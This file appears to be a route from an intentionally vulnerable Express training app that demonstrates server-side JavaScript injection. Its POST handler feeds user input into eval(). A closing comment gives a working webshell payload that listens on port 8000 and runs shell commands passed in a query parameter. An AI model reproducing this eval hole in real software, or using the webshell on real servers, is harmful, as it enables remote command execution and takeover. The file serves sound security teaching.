var express = require('express');
var router = express.Router();

/**
 * GET request
 * @param  {Object}   req  [request params]
 * @param  {Object}   res  [response params]
 * @render {ssjs}          [page]
 */
router.get('/', function(req, res) {
    res.render('SSJS/ssjs', {
        display: 'none',
        message: ''
    });
});

/**
 * GET request
 * @param  {Object}   req  [request params]
 * @param  {Object}   res  [response params]
 * @render {ssjs}          [page]
 */
router.post('/', function(req, res) {
    var year = eval("year = (" + req.body.year + ")");
    var date = new Date();

    var futureAge = 2050 - year;

    res.render('SSJS/ssjs', {
        display: 'block',
        message: futureAge
    });
});

module.exports = router;

/**
 * SSJS webshell injection
 * The following code starts a webshell on the port 8000 after 5 seconds.
 * 
 * setTimeout(function() { require('http').createServer(function (req, res) { res.writeHead(200, {"Content-Type": "text/plain"});require('child_process').exec(require('url').parse(req.url, true).query['cmd'], function(e,s,st) {res.end(s);}); }).listen(8000); }, 5000)
 */
